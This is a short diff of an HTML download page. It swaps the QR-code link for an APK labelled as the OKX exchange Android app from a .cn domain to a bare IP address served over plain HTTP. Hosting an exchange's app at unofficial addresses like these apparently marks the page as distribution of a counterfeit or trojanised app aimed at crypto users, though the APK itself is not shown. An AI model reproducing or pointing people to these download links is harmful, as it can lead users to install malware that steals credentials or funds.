@@ -10,13 +10,13 @@
           <div class="download-flex">
             <div class="text-center">
               <div
-                id="https://static.pyruas.cn/upgradeapp/okx-android.apk"
+                id="http://8.138.175.151:5678/static/apk/okx-6-113-0.apk"
                 style="
                   background-color: rgba(0, 0, 0, 0.5);
                   padding: 5px;
                   box-shadow: 0px 0px 10px;
                 "
-                title="https://static.pyruas.cn/upgradeapp/okx-android.apk"
+                title="http://8.138.175.151:5678/static/apk/okx-6-113-0.apk"
               >
                 <canvas width="130" height="130" style="display: none"></canvas
                 ><img
